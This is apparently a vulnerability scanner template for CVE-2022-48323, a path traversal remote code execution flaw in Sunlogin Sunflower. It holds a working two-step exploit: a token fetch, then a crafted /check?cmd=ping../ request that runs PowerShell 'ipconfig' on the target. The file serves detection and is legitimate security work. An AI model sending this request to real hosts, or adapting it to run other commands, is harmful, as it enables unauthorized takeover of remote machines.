http:
- extractors:
  - group: 1
    internal: true
    name: cid
    regex:
    - '"verify_string":"(.*?)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_1==200
    - status_code_2==200
    - contains(body_1, 'verify_string')
    - contains(body_2, 'Windows IP')
    type: dsl
  raw:
  - 'POST /cgi-bin/rpc HTTP/1.1

    Host: {{Hostname}}


    action=verify-haras

    '
  - 'GET /check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+ipconfig
    HTTP/1.1

    Host: {{Hostname}}

    Cookie: CID={{cid}}

    '
id: CVE-2022-48323
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:sunlogin:sunflower:1.0.1.43315:*:*:*:simple:*:*:*
    cve-id: CVE-2022-48323
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-22
    epss-percentile: 0.99592
    epss-score: 0.9069
  description: 'Sunlogin Sunflower Simplified (aka Sunflower Simple and Personal)
    1.0.1.43315 is vulnerable to a path traversal issue. A remote and unauthenticated
    attacker can execute arbitrary programs on the victim host by sending a crafted
    HTTP request, as demonstrated by /check?cmd=ping../ followed by the pathname of
    the powershell.exe program.

    '
  impact: 'Unauthenticated attackers can exploit path traversal to execute arbitrary
    programs on the victim host, potentially executing PowerShell commands and gaining
    full system control over the remote desktop application server.

    '
  metadata:
    max-request: 2
    product: sunflower
    vendor: sunlogin
  name: Sunflower Simple and Personal 1.0.1.43315 - Remote Code Execution
  reference:
  - https://www.1024sou.com/article/741374.html
  - https://copyfuture.com/blogs-details/202202192249158884
  - https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270
  - https://www.cnvd.org.cn/flaw/show/CNVD-2022-03672
  - https://asec.ahnlab.com/en/47088/
  remediation: 'Upgrade Sunlogin Sunflower to a version newer than 1.0.1.43315 that
    properly validates command parameters and prevents path traversal to system executables.

    '
  severity: critical
  tags: cve,cve2022,sunflower,rce,vkev,vuln
